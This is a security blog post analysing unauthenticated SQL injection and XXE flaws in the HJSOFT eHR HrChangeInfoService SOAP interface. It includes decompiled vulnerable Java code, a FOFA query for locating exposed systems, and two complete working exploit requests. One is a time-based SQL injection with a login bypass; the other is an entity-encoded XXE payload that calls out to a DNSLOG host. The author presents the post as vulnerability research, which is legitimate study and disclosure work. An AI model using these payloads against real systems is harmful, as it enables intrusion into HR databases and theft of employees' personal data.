---
title: "宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞"
source: https://mrxn.net/jswz/hjsoft-HrChangeInfoService-sqli.html
---

# 宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/17 08:19
* 1576浏览
* [0评论](#comment)
* 1小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

宏景人力资源管理系统（eHR）是一款由宏景软件研发的系统。宏景人力资源管理系统的
`HrChangeInfoService`
接口处存在
[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。

# 影响版本

# fofa语法

> `app="HJSOFT-HCM"`

# 漏洞分析

先看
`WEB-INF/web.xml`
里对于
`/services/*`
路由的处理由
`servlet-name`
为
`XFireServlet`
来处理

![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](https://image.mrxn.net/f743cba663974f0d8590e078ba089ecb.webp)

同时这里可以看到路由
`/servlet/XFireServlet/`
也是由
`XFireServlet`
来处理，二者均由
`XFireServlet`
来处理，那么就有两种方式来访问，对吧，利用这个差异可能绕过某些流量检测设备，对于
`/services/*`
路由下的一些
[漏洞利用](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
。

前置知识关于
`WEB-INF/classes/META-INF/xfire/services.xml`
文件的作用：

是 XFire（一个 Java Web Service 框架）用来配置 Web Service 服务的核心配置文件。它的作用是：

* 定义和描述 Web Service 服务（如服务名、实现类、接口等）。
* 配置服务的发布、协议、端点等信息。
* 控制服务的相关参数（如拦截器、传输方式等）。

简单来说，这个文件用于告诉 XFire 框架有哪些服务、怎么暴露服务以及如何处理请求。

因此我们直接去
`WEB-INF/classes/META-INF/xfire/services.xml`
查找我们本次审计的主角
`HrChangeInfoService`
部分的定义：

```
<service  xmlns="http://xfire.codehaus.org/config/1.0">
    <name>HrChangeInfoService</name>
    <namespace>http://www.hjsj.com/HrChangeInfoService</namespace>
    <serviceClass>com.hjsj.hrms.service.core.HrChangeInfoService</serviceClass>
  </service>
```

## getChangeUsers

跟进
`HrChangeInfoService`
类，看第一个方法
`getChangeUsers`
的实现

```
public String getChangeUsers(String var1, String var2, String var3) {
        if (var2 != null && var2.length() > 0 && var3 != null && var3.length() > 0) {
            boolean var4 = this.cheakCode(var2, var3);
            if (!var4) {
                return this.returnMessLog("传入的校验用户名密码错误", 1, "");
            } else {
                String var5 = "";
                Connection var6 = null;

                String var8;
                try {
                    var6 = AdminDb.getConnection();
                    ChangeInfoInterfaces var7 = new ChangeInfoInterfaces();
                    var5 = var7.getChangeUsersXML(var6, var1);
                    return var5;
                } catch (Exception var18) {
                    var18.printStackTrace();
                    var8 = this.returnMessLog("获取人员信息错误", 1, "");
                } finally {
                    try {
                        if (var6 != null) {
                            var6.close();
                        }
                    } catch (SQLException var17) {
                    }

                }

                return var8;
            }
        } else {
            return this.returnMessLog("传入的校验用户名密码不能为空！", 1, "");
        }
    }
```

三个变量 var1、var2、var3,其中后两个进入
`cheakCode`
方法

```
private boolean cheakCode(String var1, String var2) {
        boolean var3 = false;
        Connection var4 = null;
        RowSet var5 = null;

        try {
            var4 = AdminDb.getConnection();
            String var6 = "select 1 from operuser where username='" + var1 + "' and password='" + var2 + "'";
            ContentDAO var7 = new ContentDAO(var4);
            var5 = var7.search(var6);
            if (var5.next()) {
                var3 = true;
            }
```

可以看到 var2、var3 ==> var1、var2 被直接拼接进sql语句中执行，无任何过滤和校验处理，造成
[SQL注入漏](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
。

而 var1 会带入
`ChangeInfoInterfaces`
的
`getChangeUsersXML`
方法里

```
public String getChangeUsersXML(Connection var1, String var2) {
        StringBuffer var3 = new StringBuffer();
        var3.append("select * from " + this.emp_table + "");
        if (var2 != null && var2.length() > 0) {
            var3.append(" where flag='" + var2 + "'");
        }

        List var4 = ExecuteSQL.executeMyQuery(var3.toString());
        if (var4 == null) {
            return "";
        } else {
            var3.setLength(0);
            var3.append("select * from " + this.emp_table + " where 1=2");
            ArrayList var5 = this.getColumns(var1, var3.toString());
            String var6 = this.constructorXml(var5, var4);
            return var6;
        }
    }
```

同样被拼接进
`var3.append(" where flag='" + var2 + "'");`
sql语句中，直接执行造成SQL注入漏洞。

其他几个同样存在类似的sql注入漏洞：

## getWhereChangeUsers

![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](https://image.mrxn.net/4f2a09f459794833bd7b8f69b57a865f.webp)

## returnSynchroXml

### SQLi

![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](https://image.mrxn.net/eb622b46955f499fa487e96a440fbd70.webp)

### XXE

其中
`returnSynchroUserXml`
方法还存在
[XXE漏洞](https://mrxn.net/tag/XXE)

```
public boolean returnSynchroUserXml(Connection var1, String var2) {
        boolean var3 = true;
        if (var2 != null && var2.length() > 0) {
            String var4 = "/hr/element";
            SAXBuilder var6 = new SAXBuilder();
            String var7 = "";
            String var8 = "";
            StringReader var9 = new StringReader(var2.toString());
            new ArrayList();
            StringBuffer var11 = new StringBuffer();

            try {
                this.doc = var6.build(var9);
```

使用
`SAXBuilder`
解析未经验证/过滤的用户输入 (
`var2`
) 时，未禁用外部实体解析。攻击者可通过恶意XML触发外部实体注入。

## returnSynchroArray

![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](https://image.mrxn.net/b6ac42f5d44b48679cb2f46c67040e1d.webp)

## returnSynchroString

![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](https://image.mrxn.net/ee28404d9cee43859c9795912714f0c5.webp)

![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](https://image.mrxn.net/547a00d3ef3c4b52a1d0b68390bad42e.webp)

# 漏洞复现

## getChangeUsers

```
POST /servlet/XFireServlet/HrChangeInfoService HTTP/1.1
Host: hjsoft.mrxn.net
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrc="http://www.hjsj.com/HrChangeInfoService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrc:getChangeUsers>
         <hrc:changeFlag>-1'waitfor delay '0:0:5'-- </hrc:changeFlag>
         <hrc:username>1</hrc:username>
         <hrc:password>1'or '1'='1</hrc:password>
      </hrc:getChangeUsers>
   </soapenv:Body>
</soapenv:Envelope>
```

![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](https://image.mrxn.net/4e894a428b684da4aaae623706317714.webp)

成功延时 5 秒

![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](https://image.mrxn.net/380600f999ae45fd850a12afdc24e237.webp)

![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](https://image.mrxn.net/fd36cec09bf54143af7c1e7da944aeed.webp)

两种路由都是可以的噢！

## returnSynchroXml XXE

```
POST /services/HrChangeInfoService HTTP/1.1
Host: hjsoft.mrxn.net
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrc="http://www.hjsj.com/HrChangeInfoService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrc:returnSynchroXml>
         <hrc:strString>&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x66;&#x6f;&#x6f;&#x20;&#x5b;&#x20;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x78;&#x78;&#x65;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x74;&#x65;&#x73;&#x74;&#x2e;&#x64;&#x6e;&#x73;&#x6c;&#x6f;&#x67;&#x2e;&#x70;&#x74;&#x2f;&#x78;&#x78;&#x65;&#x5f;&#x74;&#x65;&#x73;&#x74;&#x22;&#x3e;&#x20;&#x5d;&#x3e;&#x3c;&#x66;&#x6f;&#x6f;&#x3e;&#x26;&#x78;&#x78;&#x65;&#x3b;&#x3c;&#x2f;&#x66;&#x6f;&#x6f;&#x3e;</hrc:strString>
         <hrc:username>1</hrc:username>
         <hrc:password>1'or '1'='1</hrc:password>
      </hrc:returnSynchroXml>
   </soapenv:Body>
</soapenv:Envelope>
```

在DNSLOG平台成功收到DNS请求和HTTP请求

![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](https://image.mrxn.net/9e38ea3d947c42a7a710b641f47fd0a3.webp)

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  Java](https://mrxn.net/tag/Java)
* [#
  XXE](https://mrxn.net/tag/XXE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](https://mrxn.net/jswz/hjsoft-HrChangeInfoService-sqli.html)
  
文章链接：
<https://mrxn.net/jswz/hjsoft-HrChangeInfoService-sqli.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hjsoft-HrChangeInfoService-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hjsoft-HrChangeInfoService-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});